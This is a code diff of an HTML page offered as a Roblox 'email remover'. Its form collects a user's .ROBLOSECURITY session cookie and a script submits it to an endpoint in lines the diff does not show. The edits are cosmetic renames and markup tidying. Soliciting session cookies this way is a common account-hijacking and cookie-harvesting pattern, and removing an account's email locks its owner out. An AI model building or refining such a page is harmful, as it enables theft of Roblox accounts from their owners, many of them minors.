@@ -1,19 +1,22 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Roblox Email Remover</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Remove Email from Roblox</title>
 </head>
 <body>
   <h2>Remove Email from Roblox</h2>
-  <form id="removeForm">
-    <label>.ROBLOSECURITY Cookie:</label><br>
-    <input type="text" id="cookie" required style="width: 100%;"><br><br>
+  <form id="remove-form">
+    <label>.ROBLOSECURITY Cookie:</label><br/>
+    <input type="text" id="cookie" name="cookie" required style="width: 100%;"><br/><br/>
     <button type="submit">Remove Email</button>
   </form>
-  <p id="result"></p>
+  <p id="response"></p>
 
   <script>
-    document.getElementById('removeForm').addEventListener('submit', async (e) => {
+    const form = document.getElementById('remove-form');
+    form.addEventListener('submit', async (e) => {
       e.preventDefault();
       const cookie = document.getElementById('cookie').value;
 
@@ -24,7 +27,7 @@
       });
 
       const data = await res.json();
-      document.getElementById('result').innerText = data.message || 'Done';
+      document.getElementById('response').textContent = data.message || 'Done.';
     });
   </script>
 </body>
